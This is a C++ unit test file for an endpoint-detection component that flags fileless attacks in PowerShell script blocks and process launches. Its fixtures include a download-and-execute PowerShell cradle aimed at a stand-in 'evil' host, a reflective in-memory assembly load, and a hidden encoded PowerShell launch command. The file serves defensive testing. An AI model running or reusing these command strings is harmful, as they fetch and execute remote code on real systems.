/*
 * fileless_attack_detector_tests.cpp - Unit tests for
 * FilelessAttackDetector.
 */
#include "fileless_attack_detector_tests.h"

#include <windows.h>

#include <stdexcept>
#include <string>

#include "edr_event.h"
#include "event_bus.h"
#include "fileless_attack_detector.h"

namespace {

#define FL_CHECK(condition) Check((condition), #condition, __LINE__)

void Check(bool condition, const char* expression, int line) {
    if (!condition)
        throw std::runtime_error(
            "fileless attack detector test failed at line " +
            std::to_string(line) + ": " + expression);
}

edr::Event PowerShellScript(uint64_t ts100ns, const char* scriptBlock,
                            const char* scriptId) {
    edr::Event event;
    event.type = EDR_EVT_POWERSHELL_SCRIPT;
    event.ts100ns = ts100ns;
    event.pid = 4321;
    event.fields[edr::field::kType] = "POWERSHELL_SCRIPT";
    event.fields[edr::field::kScriptBlockText] = scriptBlock;
    event.fields[edr::field::kScriptBlockId] = scriptId;
    return event;
}

edr::Event ProcessStart(uint64_t ts100ns, uint32_t pid, const char* image,
                        const char* commandLine) {
    edr::Event event;
    event.type = EDR_EVT_PROCESS_START;
    event.ts100ns = ts100ns;
    event.pid = pid;
    event.fields[edr::field::kType] = "PROCESS_START";
    event.fields[edr::field::kImage] = image;
    event.fields[edr::field::kCommandLine] = commandLine;
    return event;
}

bool HasField(const edr::Event& event, const char* name) {
    return event.fields.find(name) != event.fields.end();
}

bool HasFilelessFields(const edr::Event& event) {
    return HasField(event, edr::field::kFilelessScore) &&
           HasField(event, edr::field::kFilelessVerdict) &&
           HasField(event, edr::field::kFilelessTechniques);
}

bool HasNoFilelessFields(const edr::Event& event) {
    return !HasField(event, edr::field::kFilelessScore) &&
           !HasField(event, edr::field::kFilelessVerdict);
}

void TestDisabled() {
    edr::FilelessAttackDetector detector(false, 55, 300, 4096);
    edr::Event event = PowerShellScript(100000000000ULL,
        "IEX(New-Object Net.WebClient).DownloadString('http://x/p')",
        "1");
    detector.Enrich(event);
    FL_CHECK(HasNoFilelessFields(event));
    FL_CHECK(detector.StateCount() == 0);
}

void TestDownloadExecuteScript() {
    /* download + execute = 45, obfuscation (iex) = 35 -> 80. */
    edr::FilelessAttackDetector detector(true, 55, 300, 4096);
    edr::Event event = PowerShellScript(100000000000ULL,
        "IEX(New-Object Net.WebClient).DownloadString('http://evil/p.ps1')",
        "123");
    detector.Enrich(event);
    FL_CHECK(HasFilelessFields(event));
    FL_CHECK(event.fields.at(edr::field::kFilelessVerdict) == "malicious");
    std::string techniques = event.fields.at(edr::field::kFilelessTechniques);
    FL_CHECK(techniques.find("download_execute") != std::string::npos);
    FL_CHECK(techniques.find("obfuscation") != std::string::npos);
    FL_CHECK(detector.StateCount() == 1);
}

void TestReflectiveLoading() {
    /* In-memory assembly load: reflective_loading = 40, not enough alone. */
    edr::FilelessAttackDetector detector(true, 55, 300, 4096);
    edr::Event event = PowerShellScript(100000000000ULL,
        "$a=[Reflection.Assembly]::Load([byte[]]$bytes);$a.EntryPoint.Invoke()",
        "456");
    detector.Enrich(event);
    FL_CHECK(HasFilelessFields(event));
    std::string techniques = event.fields.at(edr::field::kFilelessTechniques);
    FL_CHECK(techniques.find("reflective_loading") != std::string::npos);
    FL_CHECK(detector.StateCount() == 1);
}

void TestScriptHostEncoded() {
    /* powershell -enc <base64> is the classic fileless launch. */
    edr::FilelessAttackDetector detector(true, 55, 300, 4096);
    edr::Event event = ProcessStart(100000000000ULL, 111,
        "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe",
        "powershell.exe -nop -w hidden -enc SQBFAFgA");
    detector.Enrich(event);
    FL_CHECK(HasFilelessFields(event));
    FL_CHECK(detector.StateCount() == 1);
}

void TestBenignScriptIgnored() {
    /* Benign script block text: no technique should fire. */
    edr::FilelessAttackDetector detector(true, 55, 300, 4096);
    edr::Event event = PowerShellScript(100000000000ULL,
        "Write-Host 'Hello, world'", "789");
    detector.Enrich(event);
    FL_CHECK(HasNoFilelessFields(event));
    FL_CHECK(detector.StateCount() == 1);
}

void TestInspectsTypes() {
    FL_CHECK(edr::FilelessAttackDetector::Inspects(EDR_EVT_POWERSHELL_SCRIPT));
    FL_CHECK(edr::FilelessAttackDetector::Inspects(EDR_EVT_WMI_EVENT));
    FL_CHECK(edr::FilelessAttackDetector::Inspects(EDR_EVT_PROCESS_START));
    FL_CHECK(!edr::FilelessAttackDetector::Inspects(EDR_EVT_REG_WRITE));
}

} // namespace

void RunFilelessAttackDetectorTests() {
    TestDisabled();
    TestDownloadExecuteScript();
    TestReflectiveLoading();
    TestScriptHostEncoded();
    TestBenignScriptIgnored();
    TestInspectsTypes();
}